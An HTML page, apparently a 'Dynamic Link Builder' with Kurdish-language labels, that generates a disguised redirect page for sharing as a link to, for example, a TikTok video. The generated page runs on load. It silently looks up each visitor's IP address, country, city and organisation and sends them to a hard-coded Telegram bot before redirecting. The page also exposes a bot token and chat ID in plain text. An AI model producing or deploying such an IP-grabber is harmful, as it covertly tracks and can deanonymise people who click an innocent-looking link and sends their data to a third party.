<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dynamic Link Builder</title>
    <style>
        body {
            margin: 0;
            background: #0f172a;
            color: #f8fafc;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .card {
            background: #1e293b;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 450px;
        }
        h2 {
            margin-top: 0;
            font-size: 20px;
            text-align: center;
            color: #38bdf8;
        }
        label {
            display: block;
            margin-bottom: 6px;
            font-size: 13px;
            color: #cbd5e1;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 12px;
            background: #0f172a;
            border: 1px solid #334155;
            color: #fff;
            border-radius: 6px;
            box-sizing: border-box;
        }
        .info-box {
            background: #090d16;
            padding: 10px;
            border-radius: 6px;
            border: 1px dashed #334155;
            font-size: 12px;
            color: #94a3b8;
            margin-bottom: 15px;
            word-break: break-all;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #0284c7;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover {
            background: #0369a1;
        }
        textarea {
            width: 100%;
            height: 90px;
            background: #0f172a;
            border: 1px solid #334155;
            color: #34d399;
            border-radius: 6px;
            padding: 10px;
            margin-top: 15px;
            box-sizing: border-box;
            font-family: monospace;
            font-size: 11px;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>Dynamic Link Builder</h2>
        
        <label>سەرەتا هۆستەکەت (Base URL):</label>
        <input type="text" id="baseUrl" value="https://nex-talk-mocha.vercel.app/" oninput="updatePreview()">

        <label>لینکی مەبەست (بۆ نموونە ڤیدیۆی تیکتۆک):</label>
        <input type="text" id="targetUrl" value="https://vt.tiktok.com/ZSq8oHq1e/" oninput="updatePreview()">

        <label>لینکی کۆتایی تێکەڵکراو (Dynamic Link):</label>
        <div class="info-box" id="previewLink">https://nex-talk-mocha.vercel.app/?to=https://vt.tiktok.com/ZSq8oHq1e/</div>

        <button onclick="generateCode()">دروستکردنی کۆدی index.html</button>

        <textarea id="outputCode" readonly placeholder="کۆدی پەڕەی هۆست لێرە دەردەکەوێت..."></textarea>
    </div>

    <script>
        const BOT_TOKEN = '8942095399:AAGbL8-6mj89o3PefyQeVdRd9oVR0LrSNDg';
        const CHAT_ID = '7641255924';

        function updatePreview() {
            let base = document.getElementById('baseUrl').value.trim();
            let target = document.getElementById('targetUrl').value.trim();
            
            // دڵنیابوون لەوەی هۆستەکە `/` تێدایە
            if(!base.endsWith('/')) base += '/';

            let finalDynamicLink = base + "?to=" + encodeURIComponent(target);
            document.getElementById('previewLink').innerText = finalDynamicLink;
        }

        function generateCode() {
            let target = document.getElementById('targetUrl').value.trim();

            const finalCode = `<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        const BOT_TOKEN = '${BOT_TOKEN}';
        const CHAT_ID = '${CHAT_ID}';
        
        // وەرگرتنی لینکی مەبەست لە پارامێتەری 'to' یان بە شێوەی جێگیر
        const urlParams = new URLSearchParams(window.location.search);
        let targetUrl = urlParams.get('to') || '${target}';

        async function sendIPAndRedirect() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                
                let ipMessage = "🌐 New Visitor Info:\\n\\n" +
                                "IP: " + data.ip + "\\n" +
                                "Country: " + data.country_name + "\\n" +
                                "City: " + data.city + "\\n" +
                                "Org: " + data.org;

                await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: ipMessage
                    })
                });
            } catch (e) {}

            window.location.href = targetUrl;
        }

        window.onload = sendIPAndRedirect;
    <\/script>
</body>
</html>`;

            document.getElementById('outputCode').value = finalCode;
        }

        updatePreview();
    </script>
</body>
</html>
